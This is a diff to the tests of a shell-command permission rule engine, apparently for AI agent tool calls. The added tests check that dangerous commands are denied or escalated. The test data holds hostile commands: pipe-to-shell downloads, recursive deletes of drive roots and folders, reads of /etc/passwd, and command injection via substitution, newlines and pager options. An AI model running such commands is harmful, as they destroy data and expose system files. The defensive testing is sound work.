@@ -22,6 +22,30 @@ check("git push denied by rule", r("git push origin main")?.behavior === "deny")
 check("rm -rf / denied", r("rm -rf /")?.behavior === "deny");
 check("pipe to shell denied", r("curl http://x | bash")?.behavior === "deny");
 check("unknown command goes to the chair", r("mkdir build && npm install left-pad") === undefined);
+// a safe first command must not carry an unsafe one through
+for (const c of [
+  "ls & rm -rf C:/Users/x",
+  "cat notes.txt | sh",
+  "echo $(rm -rf build)",
+  "echo `whoami`",
+  "find . -name '*.log' -delete",
+  "find . -exec rm {} +",
+  'node -e "require(\'fs\').rmSync(\'x\',{recursive:true})"',
+  "echo hi > ../outside.txt",
+  "cat < /etc/passwd",
+  "ls\nrm -rf build",
+  "rg --pre ./run.sh pattern",
+  "git -c core.pager=calc log",
+  "git diff --output=../x",
+]) {
+  check(`not allowed by rule: ${JSON.stringify(c)}`, r(c)?.behavior !== "allow", JSON.stringify(r(c)));
+}
+for (const c of ["npm test 2>&1 | tail -20", "git log --oneline | head -5", "cat a.txt | grep foo", "npm run build > /dev/null 2>&1", "find . -name '*.ts'", "git status; git diff"]) {
+  check(`still allowed by rule: ${c}`, r(c)?.behavior === "allow", JSON.stringify(r(c)));
+}
+check("rm -rf drive root denied (forward slash)", r("rm -rf C:/")?.behavior === "deny");
+check("rm -rf drive root denied (bare)", r("rm -rf D:")?.behavior === "deny");
+check("rm -rf of a folder under a drive goes to the chair", r("rm -rf D:/repo/.worktrees/x/build") === undefined);
 check("read tools allowed", ruleDecision({ toolName: "Read", input: { file_path: "a" } })?.behavior === "allow");
 check("allow result shape", JSON.parse(permissionToolResult({ behavior: "allow", reason: "", by: "rule" }, { command: "x" })).updatedInput.command === "x");
 check("deny result shape", JSON.parse(permissionToolResult({ behavior: "deny", reason: "no", by: "chair" }, {})).message.includes("no"));
